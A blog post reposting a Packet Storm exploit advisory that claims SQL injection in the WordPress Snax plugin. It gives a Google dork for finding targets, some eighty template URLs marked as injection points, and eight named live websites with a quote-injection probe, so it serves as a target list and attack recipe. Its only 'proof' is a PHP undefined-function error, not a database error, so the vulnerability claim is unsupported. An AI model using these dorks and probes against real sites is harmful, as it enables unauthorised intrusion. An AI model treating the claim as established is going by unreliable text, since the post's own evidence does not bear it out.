---
layout: post
title: WordPress Snax 4.9.x
date: 2019-01-28 00:39 +0300
categories: [Exploits, SQL Injection]
tags: [exploits]
---






![](../../../assets/img/Exploits/wpsnax.png)

There is a remote SQL injection vulnerability present in version 4.9.x of the WordPress Snax plugin.

  

```
MD5 | 61e40f8195071decd54056688046c6ce
```

```perl
    ####################################################################
    
    # Exploit Title : WordPress Snax Plugins 4.9.x SQL Injection
    # Author [ Discovered By ] : KingSkrupellos
    # Team : Cyberizm Digital Security Army
    # Date : 28/01/2019
    # Vendor Homepage : snax.bringthepixel.com
    # Software Information Link : codecanyon.net/item/snax-viral-frontend-uploader/16540363
    # Software Version : 4.9.x and other previous versions
    # Software Price : 30$
    # Tested On : Windows and Linux
    # Category : WebApps
    # Exploit Risk : Medium
    # Google Dorks : inurl:''/wp-content/plugins/snax/templates/''
    # Vulnerability Type : CWE-89 [ Improper Neutralization of
    Special Elements used in an SQL Command ('SQL Injection') ]
    
    ####################################################################
    
    # Description :
    *************
    
    Snax Viral Content Builder by bringthepixel lets site visitors (frontend) and editors (backend)
    
    create quizzes, polls, lists, memes and other viral content.
    
    ####################################################################
    
    # Impact :
    **********
    
    * WordPress Snax Plugin for WordPress 4.9.x and other versions is prone to an
    
    SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied
    
    data before using it in an SQL query.
    
    * Exploiting this issue could allow an attacker to compromise the application, read,
    
    access or modify data, or exploit latent vulnerabilities in the underlying database.
    
    If the webserver is misconfigured, read & write access to the filesystem may be possible.
    
    ####################################################################
    
    # SQL Injection Exploit :
    **************************
    
    /wp-content/plugins/snax/templates/amp/content-gallery.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/amp/content-list.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/amp/content.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/buddypress/items/loop-items.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/buddypress/items/pagination-bottom.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/buddypress/items/pagination.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/buddypress/items/section-approved.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/buddypress/items/section-pending.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/buddypress/posts/loop-posts.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/buddypress/posts/pagination-bottom.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/buddypress/posts/pagination.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/buddypress/posts/section-approved.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/buddypress/posts/section-draft.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/buddypress/posts/section-pending.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/buddypress/votes/loop-vote.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/buddypress/votes/loop-votes.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/buddypress/votes/pagination-bottom.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/buddypress/votes/pagination.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/buddypress/votes/section-downvotes.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/buddypress/votes/section-upvotes.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/content.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/demo/form-embed.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/demo/form-gallery.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/demo/form-image.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/demo/form-list.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/demo/form-meme.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/fb-instant-articles/content-list.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/items/form-edit/row-description.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/items/form-edit/row-legal.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/items/form-edit/row-referral.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/items/form-edit/row-source.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/items/form-edit/row-title.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/items/form-new-audio.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/items/form-new-embed.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/items/form-new-image.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/items/form-new-text.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/items/form-new-video.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/items/form-new.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/items/nav.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/items/note.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/pages/about.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/polls/content-answer.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/polls/content-question.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/polls/loop-answers.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/polls/loop-questions.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/polls/pagination.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/polls/poll.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/polls/progress-coins.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/posts/content-gallery.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/posts/content-list.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/posts/content.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/posts/note.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/posts/origin.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/posts/voting-box.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/posts/form-edit/row-actions.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/posts/form-edit/row-categories.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/posts/form-edit/row-description.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/posts/form-edit/row-draft-actions.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/posts/form-edit/row-featured-image.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/posts/form-edit/row-legal.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/posts/form-edit/row-list-options.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/posts/form-edit/row-referral.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/posts/form-edit/row-source.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/posts/form-edit/row-tags.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/quizzes/actions-end.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/quizzes/actions-start.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/quizzes/content-answer.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/quizzes/content-question.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/quizzes/intro.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/quizzes/loop-answers.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/quizzes/loop-questions.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/quizzes/pagination.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/quizzes/progress-coins.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/widget-call-to-action.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/widget-teaser/poll-binary.php?id=[SQL Injection]
    
    /wp-content/plugins/snax/templates/widget-teaser/poll-versus.php?id=[SQL Injection]
    
    ####################################################################
    
    # Example Vulnerable Sites :
    *************************
    
    [+] universopop.com.br/wp-content/plugins/snax/templates/widget-call-to-action.php?id=1%27
    
    [+] ongelofelijk.eu/wp-content/plugins/snax/templates/items/nav.php?id=1%27
    
    [+] ekler.mk/wp-content/plugins/snax/templates/items/nav.php?id=1%27
    
    [+] almosari3.info/wp-content/plugins/snax/templates/items/nav.php?id=1%27
    
    [+] topfivebuzz.com/wp-content/plugins/snax/templates/items/nav.php?id=1%27
    
    [+] pokestgo.cl/wp-content/plugins/snax/templates/items/nav.php?id=1%27
    
    [+] js.pl/wp-content/plugins/snax/templates/items/nav.php?id=1%27
    
    [+] yoogbe.com/wp-content/plugins/snax/templates/items/nav.php?id=1%27
    
    ####################################################################
    
    # Example SQL Database Error :
    ****************************
    
    Fatal error: Uncaught Error: Call to undefined function
    snax_get_frontend_submission_page_url() in /home/unive684/public_html
    /wp-content/plugins/snax/templates/widget-call-to-action.php:8 Stack trace:
    #0 {main} thrown in /home/unive684/public_html/wp-content/plugins
    /snax/templates/widget-call-to-action.php on line 8
    
    ####################################################################
    
    # Discovered By KingSkrupellos from Cyberizm.Org Digital Security Team
    
    ####################################################################
```

<br>
  

>*Source* :   [https://packetstormsecurity.com](https://packetstormsecurity.com)
